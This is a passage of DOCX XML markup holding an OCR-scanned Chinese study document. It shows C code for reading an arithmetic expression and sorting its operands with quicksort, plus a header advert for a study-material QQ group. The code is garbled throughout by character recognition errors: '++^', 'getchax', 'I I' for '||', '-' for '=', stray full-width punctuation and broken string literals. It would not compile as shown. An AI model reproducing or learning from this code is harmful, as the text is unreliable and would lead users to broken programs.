          <w:vertAlign w:val="superscript"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>l); quicksort (a, i+1 , high);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="840" w:right="0" w:hanging="420"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>void my Sort (int data[], char fuhao int begin, int end) { for (int i = begin; i &lt; end; ++^) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>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if (fuhao [i] == W | | fuhao [i] == ' /') {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="1680" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>//</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>先对乘除两边进行排序</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="1680" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>if (data[i] &gt; data[i+1]；{</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="2100" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>int temp = data[i];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="2100" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>data[i] = data[i+1].</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="620" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="2100" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>data[i+1] = temp;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="1000" w:line="307" w:lineRule="exact"/>
        <w:ind w:left="1680" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>my Sort (data, fuhao, begin, i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:vertAlign w:val="superscript"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>l); my Sort (data： fuhao, i+2, end); return;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="720" w:line="270" w:lineRule="exact"/>
        <w:ind w:left="840" w:right="0" w:firstLine="20"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>//</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>没有乘除号，就</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t>对-的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">数字进行排序 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>quicksort (data, begin, end);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="380" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="420"/>
        <w:jc w:val="left"/>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int n = -1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>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char temp;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>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int size__data = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="840"/>
        <w:jc w:val="left"/>
        <w:sectPr>
          <w:headerReference r:id="rId17" w:type="default"/>
          <w:headerReference r:id="rId18" w:type="even"/>
          <w:footnotePr>
            <w:numFmt w:val="decimal"/>
          </w:footnotePr>
          <w:type w:val="continuous"/>
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="1475" w:right="1650" w:bottom="1460" w:left="1714" w:header="0" w:footer="1032" w:gutter="0"/>
          <w:cols w:space="720" w:num="1"/>
          <w:rtlGutter w:val="0"/>
          <w:docGrid w:linePitch="360" w:charSpace="0"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">int size__fuhao </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:framePr w:w="5385" w:h="1635" w:wrap="around" w:vAnchor="margin" w:hAnchor="page" w:x="2628" w:y="1"/>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零声学「謐理出品</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:framePr w:w="5385" w:h="1635" w:wrap="around" w:vAnchor="margin" w:hAnchor="page" w:x="2628" w:y="1"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:line="525" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="1260"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>更多、更全面试学习技术资料清加</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Q</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">群：762073882 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">scanf </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>(”%</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>d", &amp;n)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:framePr w:w="5385" w:h="1635" w:wrap="around" w:vAnchor="margin" w:hAnchor="page" w:x="2628" w:y="1"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">getchax </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:framePr w:w="5385" w:h="1635" w:wrap="around" w:vAnchor="margin" w:hAnchor="page" w:x="2628" w:y="1"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>scanf</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>("％</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>c”, &amp;temp);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:framePr w:w="2880" w:h="1905" w:wrap="around" w:vAnchor="margin" w:hAnchor="page" w:x="2613" w:y="1891"/>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 xml:space="preserve">int num </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>0; bool munes = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:framePr w:w="2880" w:h="1905" w:wrap="around" w:vAnchor="margin" w:hAnchor="page" w:x="2613" w:y="1891"/>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 xml:space="preserve">while (temp != </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:vertAlign w:val="superscript"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>9</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> \n ){</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:framePr w:w="2880" w:h="1905" w:wrap="around" w:vAnchor="margin" w:hAnchor="page" w:x="2613" w:y="1891"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="840" w:right="0" w:hanging="400"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>if (temp == ' +' I I temp //</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">添加数字 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>if (munes){</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:framePr w:w="2355" w:h="285" w:wrap="around" w:vAnchor="margin" w:hAnchor="page" w:x="5643" w:y="291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 g =='/'){</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:framePr w:w="1170" w:h="270" w:wrap="around" w:vAnchor="margin" w:hAnchor="page" w:x="3873" w:y="3856"/>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num = "num;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:framePr w:w="1800" w:h="975" w:wrap="around" w:vAnchor="margin" w:hAnchor="page" w:x="3453" w:y="4396"/>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data [size__data++] num = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:framePr w:w="1800" w:h="975" w:wrap="around" w:vAnchor="margin" w:hAnchor="page" w:x="3453" w:y="4396"/>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 xml:space="preserve">munes </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:framePr w:w="375" w:h="240" w:wrap="around" w:vAnchor="margin" w:hAnchor="page" w:x="5553" w:y="4486"/>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num</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:framePr w:w="2010" w:h="570" w:wrap="around" w:vAnchor="margin" w:hAnchor="page" w:x="3453" w:y="5731"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="40" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>//</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>添加符号</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:framePr w:w="2010" w:h="570" w:wrap="around" w:vAnchor="margin" w:hAnchor="page" w:x="3453" w:y="573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fuhao[s i z e_fuhao++]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:framePr w:w="3135" w:h="1590" w:wrap="around" w:vAnchor="margin" w:hAnchor="page" w:x="3048" w:y="6571"/>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else if (temp &gt;= ‘0’ &amp;&amp;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:framePr w:w="3135" w:h="1590" w:wrap="around" w:vAnchor="margin" w:hAnchor="page" w:x="3048" w:y="6571"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="100" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">num </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>num*10 + temp - ‘0’ ； } else if (temp == '</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:framePr w:w="3135" w:h="1590" w:wrap="around" w:vAnchor="margin" w:hAnchor="page" w:x="3048" w:y="6571"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>//</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>谒见负号</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:framePr w:w="3135" w:h="1590" w:wrap="around" w:vAnchor="margin" w:hAnchor="page" w:x="3048" w:y="6571"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>munes = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:framePr w:w="1380" w:h="345" w:wrap="around" w:vAnchor="margin" w:hAnchor="page" w:x="5568" w:y="6616"/>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temp &lt;= ‘96</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="25"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:framePr w:w="510" w:h="270" w:wrap="around" w:vAnchor="margin" w:hAnchor="page" w:x="5778" w:y="6046"/>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temp;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="25"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
